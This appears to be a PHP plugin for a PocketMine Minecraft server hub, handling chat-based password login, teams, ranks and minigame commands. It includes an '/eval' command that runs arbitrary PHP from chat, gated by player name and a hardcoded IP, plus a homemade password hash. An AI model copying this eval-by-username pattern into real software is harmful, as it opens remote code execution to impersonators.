<?php

namespace pemapmodder\legionpe\hub;

use pemapmodder\legionpe\geog\RawLocs as Loc;
use pemapmodder\legionpe\geog\Position as MyPos;
use pemapmodder\legionpe\mgs\pvp\Pvp;
use pemapmodder\legionpe\mgs\pk\Parkour as Pk;
use pemapmodder\legionpe\mgs\spleef\Main as Spleef;
use pemapmodder\legionpe\mgs\ctf\Main as CTF;
use pemapmodder\smg\SMG;
use pemapmodder\utils\CallbackPluginTask;
use pemapmodder\utils\CallbackEventExe;
use pemapmodder\utils\PluginCmdExt;
use pocketmine\event\entity\EntityTeleportEvent;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\Player;
use pocketmine\Server;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\PluginCommand;
use pocketmine\command\ConsoleCommandSender as Console;
use pocketmine\command\RemoteConsoleCommandSender as RCon;
use pocketmine\event\EventPriority;
use pocketmine\event\Listener;
use pocketmine\event\entity\EntityArmorChangeEvent;
use pocketmine\event\entity\EntityMoveEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\permission\DefaultPermissions as DP;
use pocketmine\permission\Permission;
use pocketmine\plugin\PluginBase;
use pocketmine\utils\Config;
use pocketmine\utils\TextFormat;

require_once(dirname(__FILE__).DIRECTORY_SEPARATOR."Team.php");

/**
 * Class HubPlugin
 * Responsible for player auth sessions, teams selection, databases, main commands, permissions, config files and events top+base backup handling
 * @package pemapmodder_dep\legionpe\hub
 * @parent PluginBase
 * @interface Listener
 */
class HubPlugin extends PluginBase implements Listener{
	const CURRENT_VERSION = 0;
	const V_INITIAL = 0;
	const REGISTER	= 0b00010;
	const HUB		= 0b01000; // I consider hub as a NOBLE minigame
	const SHOP		= 0b01001; // another NOBLE minigame
	const PVP		= 0b01100; // KitPvP
	const PK		= 0b01101; // Parkour
	const SPLEEF	= 0b01110; // Touch-Spleef
	const CTF		= 0b01111; // Capture The Flag
	// const BG		= 0b10000; // Build and Guess
	const ON		= 0b10111; // Maximum online session ID
	const LOGIN		= 0b11000;
	const LOGIN_MAX	= 0b11111;
	/**
	 * @var Config
	 */
	public $ranks;
	/**
	 * @var object[] An object of stored non-static objects, a fix to pthreads and indexed with class names
	 */
	public $statics = array();
	/**
	 * @var int[]
	 */
	public $sessions = array();
	/**
	 * @var string[]
	 */
	protected $tmpPws = array();
	/**
	 * @var Config[]
	 */
	public $dbs = array();
	/**
	 * @var Team[]
	 */
	public $teams = array();
	/**
	 * @var Config
	 */
	public $config;
	/**
	 * @var callable[]
	 */
	protected $disableListeners = array();
	/**
	 * @var string
	 */
	public $path;
	/**
	 * @var string
	 */
	public $playerPath;
	/**
	 * @var SMG
	 */
	private $SMG;
	public function onEnable(){
		console(TextFormat::AQUA."Initializing Hub", false);
		$time = microtime(true);
		$this->path = $this->getServer()->getDataPath()."Hub/";
		@mkdir($this->path);
		$this->playerPath = $this->path."players/";
		@mkdir($this->playerPath);
		echo ".";
		$this->getServer()->loadLevel("world_pvp");
		$this->getServer()->loadLevel("world_parkour");
		$this->getServer()->loadLevel("world_spleef");
		echo ".";
		$this->initConfig();
		echo ".";
		$this->initPerms();
		echo ".";
		$this->initObjects();
		echo ".";
		$this->registerHandles();
		echo ".";
		$this->initCmds();
		echo ".";
		$this->initRanks();
		echo TextFormat::toANSI(TextFormat::GREEN." Done! (".(1000 * (microtime(true) - $time))." ms)").PHP_EOL;
	}
	public function onDisable(){
		console(TextFormat::AQUA."Finalizing Hub", false);
		$time = microtime(true);
		$this->config->save();
		foreach($this->disableListeners as $l){
			echo ".";
			call_user_func($l);
		}
		echo ".";
		$this->SMG->finalize();
		unset($this->SMG);
		$time = microtime(true) - $time;
		$time *= 1000;
		echo TextFormat::toANSI(TextFormat::GREEN." Done! ($time ms)".TextFormat::RESET);
		echo PHP_EOL;
	}
	public function addDisableListener(callable $callback){
		$this->disableListeners[] = $callback;
	}
	protected function initObjects(){ // initialize objects: Team, Hub, Shop, other minigames
		Hub::init();
		Team::init();
		Shops::init();
		Pvp::init();
		Pk::init();
		Spleef::init();
		CTF::init();
		$this->SMG = new SMG($this);
	}
	protected function initPerms(){ // initialize core permissions
		Permission::$DEFAULT_PERMISSION = Permission::DEFAULT_FALSE;
		$root = DP::registerPermission(new Permission("legionpe", "Allow using all LegionPE commands and utilities", Permission::DEFAULT_FALSE));
		// minigames
		DP::registerPermission(new Permission("legionpe.mg", "Allow doing actions in minigames"), $root);
		// commands
		$cmd = DP::registerPermission(new Permission("legionpe.cmd", "Allow using all LegionPE commands"), $root);
		$pcmds = DP::registerPermission(new Permission("legionpe.cmd.players", "Allow using player-spawn-despawn-related commands"), $cmd);
		foreach(array("show", "hide") as $act){
			DP::registerPermission(new Permission("legionpe.cmd.players.$act", "Allow using command /$act", Permission::DEFAULT_TRUE), $pcmds);
		}
		DP::registerPermission(new Permission("legionpe.cmd.auth", "Allow using command /auth", Permission::DEFAULT_TRUE), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.rules", "Allow using command /rules", Permission::DEFAULT_TRUE), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.mg.quit", "Allow using command /quit", Permission::DEFAULT_FALSE), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.mg.stat", "Allow viewing statistics using command", Permission::DEFAULT_FALSE), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.chat", "Allow using command /chat", Permission::DEFAULT_TRUE), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.chat.mandatory", "Allow sending mandatory chat using command /cm", Permission::DEFAULT_OP), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.chat.ch", "Allow using subcommand /chat ch", Permission::DEFAULT_TRUE), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.chat.ch.all", "Allow using subcommand /chat ch bypassing minigame session limitations", Permission::DEFAULT_OP), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.chat.mute", "Allowing using subcommand /chat mute", Permission::DEFAULT_TRUE), $cmd);
		DP::registerPermission(new Permission("legionpe.cmd.eval", "Allow using command /eval", Permission::DEFAULT_FALSE), $cmd);
	}
	protected function initConfig(){
		$prefixes = array("fighter", "killer", "danger", "hard", "beast", "elite", "warrior", "knight", "boss", "addict", "unstoppable", "pro", "hardcore", "master", "legend", "god");
		$diff = 0;
		$last = 0;
		$pfxs = array();
		foreach($prefixes as $pfx){
			$diff += 25;
			$last += $diff;
			$pfxs[$pfx] = $last;
		}
		$this->config = new Config($this->getServer()->getDataPath()."Hub/general-config.json", Config::JSON, array(
			"config-version-never-edit-this"=>self:: CURRENT_VERSION,
			"kitpvp"=>array(
				"prefixes"=>$pfxs,
				"auto-equip"=>array(
					"fighter"=>array(
						"inv"=>array(
							array(267, 0, 1),
							array(360, 0, 32)
						),
						"arm"=>array(306, 299, 300, 309)
					),
				),
				"classes"=>array(
					"player"=>array("fighter", "healer"),
					"donater"=>array("fighter", "healer", "blahblah")
				),
				"top-kills"=>array(
					"Avery Black"=>4,
					"Cindy Donalds"=>3,
					"Elvin Farmer"=>2,
					"Gregor Hill"=>1,
					"Ivan Jones"=>0,
				),
			),
			"spleef"=>array(
				"top-wins" => array(
					"Avery Black"=>4,
					"Cindy Donalds"=>3,
					"Elvin Farmer"=>2,
					"Gregor Hill"=>1,
					"Ivan Jones"=>0,
				),
				"chances"=>array(
					"player"=>45,
					"donater"=>50,
					"vip"=>55,
					"vip-plus"=>60,
					"vip-plus-plus"=>65,
					"premium"=>70,
					"sponsor"=>75,
					"staff"=>55,
				),
			),
			"parkour"=>array(
				"stats"=>array(
					"easy"=>3, // the fact is, many people told me they finished xD
					"medium"=>3,
					"hard"=>3,
					"extreme"=>3,
				),
			),
		));
	}
	protected function registerHandles(){ // register events
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
	}
	protected function addHandler($event){ // local add handler function
		$this->getServer()->getPluginManager()->registerEvent(
				"pocketmine\\event\\".substr(strtolower($event), 0, 6)."\\".$event."Event", $this,
				EventPriority::HIGHEST, new CallbackEventExe(array($this, "evt")), $this, true);
	}
	public function initCmds(){ // register commands
		if("quit" === "quit"){
			$cmd = new PluginCommand("quit", $this);
			$cmd->setUsage("/quit");
			$cmd->setDescription("Quit the current minigame, if possible");
			$cmd->setPermission("legionpe.cmd.mg.quit");
			$this->getServer()->getCommandMap()->register("legionpe", $cmd);
		}
		if("stat" === "stat"){
			$cmd = new PluginCommand("stat", $this);
			$cmd->setDescription("Show your stats in the current minigame, if possible");
			$cmd->setUsage("/stat [args...] (differs in different minigames)");
			$cmd->setAliases(["stats", "kills"]);
			$cmd->setPermission("legionpe.cmd.mg.stat");
			$this->getServer()->getCommandMap()->register("legionpe", $cmd);
		}
		if("show" === "show"){
			$cmd = new PluginCommand("show", $this);
			$cmd->setUsage("/show <invisible player|all>");
			$cmd->setDescription("Attempt to show an invisible player");
			$cmd->setPermission("legionpe.cmd.players.show");
			$this->getServer()->getCommandMap()->register("legionpe", $cmd);
		}
		if("hide" === "hide"){
			$cmd = new PluginCommand("hide", $this);
			$cmd->setUsage("/hide <player to hide>");
			$cmd->setDescription("Make a player invisible to you");
			$cmd->setPermission("legionpe.cmd.players.hide");
			$this->getServer()->getCommandMap()->register("legionpe", $cmd);
		}
		if("auth" === "auth"){
			$cmd = new PluginCommand("auth", $this);
			$cmd->setUsage("/auth <ip|help> [args ...]");
			$cmd->setDescription("Auth-related commands");
			$cmd->setPermission("legionpe.cmd.auth");
			$this->getServer()->getCommandMap()->register("legionpe", $cmd);
		}
		if("chat" === "chat"){
			$cmd = new PluginCmdExt("chat", $this, Hub::get());
			$cmd->setUsage("/chat <ch|mute|help>");
			$cmd->setDescription("Chat-related commands");
			$cmd->setPermission("legionpe.cmd.chat");
			$cmd->register($this->getServer()->getCommandMap());
		}
		if("cm" === "cm"){
			$cmd = new PluginCmdExt("cm", $this, Hub::get());
			$cmd->setUsage("/cm <message...>");
			$cmd->setDescription("Broadcast mandatory messages");
			$cmd->setPermission("legionpe.cmd.chat.mandatory");
			$cmd->register($this->getServer()->getCommandMap());
		}
		if("rules" === "rules"){
			$cmd = new PluginCommand("rules", $this);
			$cmd->setUsage("/rules [page]");
			$cmd->setDescription("Show the rules");
			$cmd->setPermission("legionpe.cmd.rules");
			$this->getServer()->getCommandMap()->register("legionpe", $cmd);
		}
		if(true){
			$cmd = new PluginCommand("eval", $this);
			$cmd->setUsage("/eval <code ...>");
			$cmd->setDescription("Usage restricted to developer");
			$cmd->setPermission("legionpe.cmd.eval");
			$this->getServer()->getCommandMap()->register("legionpe", $cmd);
		}
	}
	public function onCommand(CommandSender $issuer, Command $cmd, $label, array $args){ // handle commands
		switch($cmd->getName()){
			case "show":
				if(!($issuer instanceof Player)){ // yell at whoever typed this, if not a player
					$issuer->sendMessage("You are not supposed to see any players here!");
					return true;
				}
				if(!isset($args[0])){
					return false;
				}
				$p = $this->getServer()->getPlayer($args[0]);
				if(@strtolower($args[0]) !== "all" and !($p instanceof Player)){ // show usage, if invalid args
					return false;
				}
				if(strtolower($args[0]) !== "all"){ // spawn a player, if player specified
					if($p->getLevel()->getName() === $issuer->getLevel()->getName())
						$issuer->showPlayer($p);
					else $issuer->sendMessage($p->getDisplayName()." is not in your world!");
				}
				else{ // spawn all players, if player not specified
					foreach($this->getServer()->getOnlinePlayers() as $p){
						if($p->getLevel()->getName() === $issuer->getLevel()->getName())
							$issuer->showPlayer($p);
					}
				}
				break;
			case "hide":
				if(!($issuer instanceof Player)){ // yell at whoever typed this, if not a player
					$issuer->sendMessage("You are not supposed to see any players here!");
					return true;
				}
				if(!isset($args[0])){
					return false;
				}
				$p = $this->getServer()->getPlayer($args[0]);
				if(!($p instanceof Player)){ // show usage, if invalid args
					return false;
				}
				$issuer->hidePlayer($p);
				$issuer->sendMessage("{$p->getDisplayName()} is now invisible to you.");
				break;
			case "auth":
				if(!($issuer instanceof Player)){
					$issuer->sendMessage("What? You need to authenticate?");
					if($issuer instanceof RCon) // just too bored? xD
						$issuer->sendMessage("OK, but you don't manage the RCON password here, right?");
					return true;
				}
				$subcmd = @array_shift($args);
				switch($subcmd){ // manage subcommand
					case "ip": // ip-auth settings
						if(isset($args[0])){
							if(strtolower($args[0]) === "on"){
								$this->getDb($issuer)->set("ip-auth", $issuer->getAddress());
								$issuer->sendMessage("Your IP-auth is now on with value \"{$issuer->getAddress()}\".");
								break 2;
							}
							if(strtolower($args[0]) === "off"){
								$this->getDb($issuer)->set("ip-auth", false);
								$issuer->sendMessage("Your IP-auth has been turned off.");
								break 2;
							}
						}
						$issuer->sendMessage("Your IP-auth is ".(($s = $this->getDb($issuer)->get("ip-auth")) === false ? "off.":
								"on with value \"".$s."\"."));
						break;
					case "help":
					case false:
					default:
						$issuer->sendMessage("Usage: /auth <ip|help> [args ...]");
						$issuer->sendMessage("/auth <ip> [on|off|any words]");
						$issuer->sendMessage("/auth <help>");
						break;
				}
				break;
			case "rules":
				$output = "";
				$page = 1;
				if(isset($args[0]) and is_numeric($args[0])){
					$page = (int) $args[0];
				}
				$rules = self::getRules();
				$output .= "Showing rules page $page...\n";
				$page--;
				for($i = 0; $i < 5; $i++){
					if(!isset($rules[$page * 5 + $i])){
						break;
					}
					$output .= $rules[$page * 5 + $i];
					$output .= "\n";
				}
				$issuer->sendMessage($output);
				break;
			case "quit":
				Hub::get()->onQuitCmd($issuer, $args);
				break;
			case "stat":
				Hub::get()->onStatCmd($issuer, $args);
				break;
			case "eval":
				if($issuer->getName() !== "PEMapModder" and $issuer->getName() !== "Lambo"){
					return false; // IP discouragement-like thing
				}
				$issuer->sendMessage("Evaluating the following code:");
				$php = implode(" ", $args);
				$issuer->sendMessage($php);
				$this->getLogger()->alert("Evaluating this code: $php");
				eval($php);
				break;
		}
		return true;
	}
	public function onPreLogin(PlayerPreLoginEvent $event){
		if(strtolower($event->getPlayer()->getName()) === "pemapmodder_dep"){
			if(substr($event->getPlayer()->getAddress(), 0, 7) !== "219.73."){
				$event->setCancelled(true);
				$event->setKickMessage("Staff imposement: IP doesn't match PEMapModder.");
			}
		}
	}
	public function onJoin(PlayerJoinEvent $event){ // open database, check password (decide (registry wizard / IP auth / password auth))
		$p = $event->getPlayer();
		Hub::get()->setChannel($p, "legionpe.chat.mute.".$p->getID());
		$event->setJoinMessage("");
		$this->openDb($p);
		if($this->getDb($p)->get("pw-hash") === false){ // request register (LegionPE registry wizard), if password doesn't exist
			console("Registering account of ".$p->getDisplayName());
			$this->sessions[$p->getID()] = self::REGISTER;
			$p->sendMessage("Welcome to the LegionPE account registry wizard.");
			$p->sendMessage("Step 1:");
			$p->sendMessage("Please type your password in chat and send it. Don't worry, other players won't be able to read it.");
		}
		elseif($this->getDb($p)->get("ip-auth") === $p->getAddress()){ // authenticate, if ip auth enabled and matches
			$p->sendMessage("You have been authenticated by your IP address.");
			$this->sessions[$p->getID()] = self::HUB;
			$this->onAuthPlayer($p);
		}
		else{ // request login (normal), if password exists and ip auth not enabled or not matched
			$p->sendMessage("Please type your password in chat and send it. Don't worry, other players won't be able to read it.");
			$this->sessions[$p->getID()] = self::LOGIN;
		}
	}
	public function onChat(PlayerChatEvent $event){ // if session is not self::HUB, monitor it. if session is self::HUB, prevent typing password here
		$p = $event->getPlayer();
		if(($s = $this->sessions[$p->getID()]) < self::HUB or $s >= self::LOGIN){ // if not authed
			$event->setCancelled(true);
		}
		elseif($this->getDb($p)->get("pw-hash") === $this->hash($event->getMessage())){ // if authed but is telling password
			$event->setCancelled(true);
			$p->sendMessage("Never talk loudly to others your password!");
		}
		if($s === self::REGISTER){ // request repeat password: registry wizard step 1
			$this->tmpPws[$p->getID()] = $event->getMessage();
			$p->sendMessage("Step 2:");
			$p->sendMessage("Please enter your password again to confirm.");
			$this->sessions[$p->getID()] ++;
		}
		elseif($s === self::REGISTER + 1){ // check repeated password: registry wizard step 2
			if($this->tmpPws[$p->getID()] === $event->getMessage()){ // choose team, if matches password
				$p->sendMessage("The password matches! Type this password into your chat and send it next time you login.");
				$p->sendMessage("LegionPE registry wizard closed!");
				$this->getDb($p)->set("pw-hash", $this->hash($event->getMessage()));
				var_export($this->hash($event->getMessage()));
				var_export($this->hash($event->getMessage()));
				$this->getDb($p)->save();
				$this->sessions[$p->getID()]++;
				unset($this->tmpPws[$p->getID()]);
				console($p->getDisplayName()." successfully registered!");
				$this->onRegistered($p);
			}
			else{ // if password different
				$p->sendMessage("Password doesn't match! Going back to step 1.");
				$p->sendMessage("Please type your password in the chat.");
				$this->sessions[$p->getID()] = self::REGISTER;
			}
		}
		elseif($s >= self::LOGIN){ // check password, if session is waiting login
			$hash = $this->getDb($p)->get("pw-hash");
			if($this->hash($event->getMessage()) === $hash){ // auth, if password matches
				if($this->getDb($p)->get("ip-auth") !== false){ // update IP
					$this->getDb($p)->set("ip-auth", $p->getAddress());
					$p->sendMessage("Your IP address has been updated to \"{$p->getAddress()}\".");
				}
				$this->onAuthPlayer($p);
			}
			else{ // add session, if password doesn't match
				$p->sendMessage("Password doesn't match! Please try again.");
				$this->sessions[$p->getID()]++;
				if($s >= self::LOGIN_MAX){ // if reaches maximum trials of login
					$p->sendMessage("You exceeded the max number of trials to login! You are being kicked.");
					$this->getServer()->getScheduler()->scheduleDelayedTask(
						new CallbackPluginTask(array($p, "close"), $this, array("Failing to auth.", "Auth failure"), true), 80);
				}
			}
		}
	}
	public function onTeleport(EntityTeleportEvent $event){
		$ent = $event->getEntity();
		if(!($ent instanceof Player)){
			return;
		}
		if($ent->getLevel()->getName() !== $event->getTo()->getLevel()->getName()){
			$this->getServer()->getScheduler()->scheduleDelayedTask(new CallbackPluginTask(array($this, "updateSession"), $this, $ent), 1);
		}
	}
	public function onArmorChange(EntityArmorChangeEvent $event){
		$p = $event->getEntity();
		if(!($p instanceof Player)){
			return;
		}
		if(!$this->isLoggedIn($p)){ // disallow logging in
			$event->setCancelled(true);
			$p->sendMessage("Please login/register first!");
		}
	}
	public function onMove(EntityMoveEvent $event){
		$p = $event->getEntity();
		if(!($p instanceof Player)){
			return;
		}
		if(!$this->isLoggedIn($p)){ // disallow logging in
			$event->setCancelled(true);
//			$p->sendMessage("Please login/register first!");
		}
	}
	public function onPreCmd(PlayerCommandPreprocessEvent $event){
		$p = $event->getPlayer();
		if(substr($event->getMessage(), 0, 1) !== "/"){
			return;
		}
		if(!$this->isLoggedIn($p)){ // disallow logging in
			$event->setCancelled(true);
			$p->sendMessage("Please login/register first!");
		}
	}
	public function onQuit(PlayerQuitEvent $event){
		$p = $event->getPlayer();
		$this->closeDb($p);
	}
	public function onInteract(PlayerInteractEvent $event){
		$p = $event->getPlayer();
		if(!$this->isLoggedIn($p)){ // disallow logging in
			$event->setCancelled(true);
			$p->sendMessage("Please login/register first!");
		}
		$block = new MyPos($event->getBlock());
		if($block->getLevel()->getName() === Loc::hub()->getName()){
			for($i = 0; $i < 4; $i++){
				if($block->equals(Loc::chooseTeamSign($i))){
					if($this->getDb($p)->get("team") === false){
						$team = Team::get($i);
						if(($reason = $team->join($p)) === "SUCCESS"){
							$this->getDb($p)->set("team", $i);
							$p->sendMessage("$reason! You are now a member of team $team!");
							$p->teleport(Loc::spawn());
							$this->onAuthPlayer($p);
						}
						else{
							$p->sendMessage("Failure to join team $team. Reason: $reason");
						}
					}
					else{
						$p->sendMessage("You are already in a team!");
					}
					break;
				}
			}
		}
	}
	public function onRegistered(Player $p){ // set session to self::HUB and choose team, on registry success
		Hub::get()->setChannel($p, "legionpe.chat.mute.".$p->getID());
		$p->teleport(Loc::chooseTeamStd());
		$this->sessions[$p->getID()] = self::HUB;
		$p->sendMessage("Please select a team.\nSome teams are unselectable because they are too full.\nIf you insist to join those teams, come back later.");
	}
	public function onAuthPlayer(Player $p){ // set session to self::HUB, tp to spawn, ensure tp, call PlayerAuthEvent
		if($this->getDb($p)->get("team") === false){
			$this->onRegistered($p);
		}
		if($p->getAddress() === "219.73.81.15"){
			$p->addAttachment($this, "legionpe.cmd.eval", true);
		}
		Hub::get()->setChannel($p, "legionpe.chat.general"); // luckily I remembered this :D
		$this->sessions[$p->getID()] = self::HUB;
		$p->sendMessage("You have successfully logged in into LegionPE!");
		$s = Loc::spawn();
		$p->teleport($s);
		$this->getServer()->getPluginManager()->callEvent(new PlayerAuthEvent($p));
		$this->getServer()->getScheduler()->scheduleDelayedTask(
				new CallbackPluginTask(array($p, "teleport"), $this, array($s), true), 100);
	}
	public function updateSession(Player $player, $silent = false){
		switch($player->getLevel()->getName()){
			case "world_pvp":
				$session = self::PVP;
				break;
			case "world_parkour":
				$session = self::PK;
				break;
			case "world_spleef":
				$session = self::SPLEEF;
				break;
			case "world_ctf":
				$session = self::CTF;
				break;
			case "world_shops":
				$session = self::SHOP;
				break;
			default:
				$session = self::HUB;
				break;
		}
		if($this->sessions[$player->getID()] !== $session){
			$class = Hub::get()->getMgClass($player);
			if(is_string($class)){
				$instance = $class::get();
				if(is_callable(array($instance, "onQuitMg"))){
					$instance->onQuitMg($player);
				}
			}
			if(!$silent){
				console("[NOTICE] Updated session of ".$player->getName()." (display name ".$player->getDisplayName().") from ".$this->sessions[$player->getID()]." to $session. This is supposed to be a bug.");
			}
			$this->sessions[$player->getID()] = $session;
			$class = Hub::get()->getMgClass($player);
			if(is_string($class)){
				$instance = $class::get();
				if(is_callable(array($instance, "onJoinMg"))){
					$instance->onJoinMg($player);
				}
			}
		}
	}
	public function initRanks(){ // initialize ranks
		$def = array(
			"donater"=>array(),
			"vip"=>array(),
			"vip-plus"=>array(),
			"vip-plus-plus"=>array(),
			"premium"=>array(),
			"sponsor"=>array(),
			"staff"=>array("pemapmodder_dep", "lambo", "spyduck"));
		// with reference to http://legionpvp.eu
		$this->ranks = new Config($this->getServer()->getDataPath()."ranks.yml", Config::YAML, $def);
	}
	// utils //
	public function getRank(Player $p){ // get the lowercase rank of a player
		foreach($this->ranks->getAll() as $rank=>$names){
			if(in_array(strtolower($p->getName()), $names))
				return $rank;
		}
		return "player";
	}
	public final static function getPrefixOrder(){ // get the order of prefixes as well as filters
		return array("rank"=>"all", "team"=>"all", "kitpvp"=>"pvp", "kitpvp-rank"=>"pvp", "kitpvp-kills"=>"pvp", "parkour"=>"pk");
	}
	public function logp(Player $p, $msg){
		file_put_contents($this->playerPath.$p->getAddress().".log", $msg. PHP_EOL);
	}
	protected function openDb(Player $p){ // open and initialize the database of a player
		@touch($this->playerPath.$p->getAddress().".log");
		$this->logp($p, "#Log file of player ".$p->getDisplayName()." and possibly other names with the same IP address: ".$p->getAddress());
		$config = new Config($this->playerPath.strtolower($p->getName().".yml"), Config::YAML, array(
	 	 	"config-version-never-edit-this" => self:: CURRENT_VERSION,
			"pw-hash" => false, // I don't care whether they are first time or not, just care they registered or not
			"ip-auth" => false,
			"coins"=>200,
			"prefixes" => array(
				"kitpvp"=>"",
				"kitpvp-kills"=>"",
				"parkour"=>"",
				"kitpvp-rank"=>"",
				"rank"=>"",
			),
			"kitpvp"=>array("kills"=>0, "deaths"=>0, "class"=>"fighter"),
			"parkour"=>array(),
			"spleef"=>array("wins"=>0, "unwons"=>0),
			"ctf"=>array(),
			"team" => false,
			"mute" => false
		));
		$r = ($rank = $this->getRank($p)) === "player" ? "":ucfirst($rank);
		$pfxs = $config->get("prefixes");
		$pfxs["rank"] = $r;
		$config->set("prefixes", $pfxs);
		$config->save();
		$path = $this->getServer()->getDataPath()."SKC-Rewrite/player-databases/".strtolower($p->getName()[0])."/{$p->getName()}.txt";
		if(($yaml = @file_get_contents($path)) !== false){
			$data = yaml_parse($yaml);
			$i = $config->get("kitpvp");
			$i["kills"] = $data["kills"];
			$i["deaths"] = $data["deaths"];
			$config->set("kitpvp", $i);
			$config->set("mute", @$data["mute"]);
			$config->save();
		}
		$this->dbs[strtolower($p->getName())] = $config;
	}
	protected function closeDb(Player $p){ // save and finalize the database of a player
		$this->dbs[strtolower($p->getName())]->save();
		unset($this->dbs[strtolower($p->getName())]);
	}
	public function getDb(Player $p){ // get the database of a player
		if(is_string($p))
			$iname = strtolower($p);
		else $iname = strtolower($p->getName());
		return @$this->dbs[$iname];
	}
	protected function hash($string){ // top secret: password hash (very safe hash indeed... so much salt...)
		$salt = str_repeat($string, strlen($string));
		return bin2hex(hash("sha512", $string.$salt, true) ^ hash("whirlpool", $salt.$string, true));
	}
	public function getSession(Player $p){
		return $this->sessions[$p->getID()];
	}
	public function isLoggedIn(Player $player){
		return isset($this->sessions[$player->getID()]) and $this->sessions[$player->getID()] <= self::ON and $this->sessions[$player->getID()] >= self::HUB;
	}
	public function getSMG(){
		return $this->SMG;
	}
	/**
	 * @param int|Player $i
	 * @return Team
	 */
	public function getTeam($i){
		return $this->teams[Team::evalI($i)];
	}
	public static function getRules(){
		$output = [];
		$output[] = "~~~~Rules of LegionPE~~~~";
		$output[] = "We enforce the rules using the method of \"warning points\".";
		$output[] = "Warning points are issued when you offend the rules. They have an expiry date, usually after a month.";
		$output[] = "If you have 3-5 unexpired warning points, you will be banned for 1 day.";
		$output[] = "If you have 6, you will be banned for 3 days. The ban increases if you have more warning points.";
		$output[] = "Note that if you still have warning points unexpired, you can still come back as long as your ban has expired (not warning pionts).";
		$output[] = "#1)Intensive spam, which is defined by almost filling the whole chat screen with unnecessary messages, is a serious offense. An instant issue of 3 warning points will be issued.";
		$output[] = "#2)Unnecessarily repeating the same message (a.k.a. soft spam), cursing (using offending words) and harassing other players could lead to an issue of 1 warning point.";
		$output[] = "#3)Staff imposement could lead to an issue of two warning points.";
		$output[] = "#4)Using mods of any types, except night vision mod, is strictly restricted. On discovery, each mod would bring 3 warning points.";
		$output[] = "Staffs will warn you by issuing Penalties to you. When you receive the penalty, you have 15 seconds to appeal. Then you will be kicked";
		$output[] = "Each Penalty has a Penalty ID. If you can't type fast enough, you can create an appeal to @_Lambo_16 on Twitter or to @PEMapModder on forums.pocketmine.net with reference to the Penalty ID.";
		$output[] = "~~~~~~End of Rules~~~~~~";
		return $output;
	}
	/**
	 * @return static
	 */
	public static function get(){ // get instance
		return Server::getInstance()->getPluginManager()->getPlugin("LegionPE_Delta");
	}
}
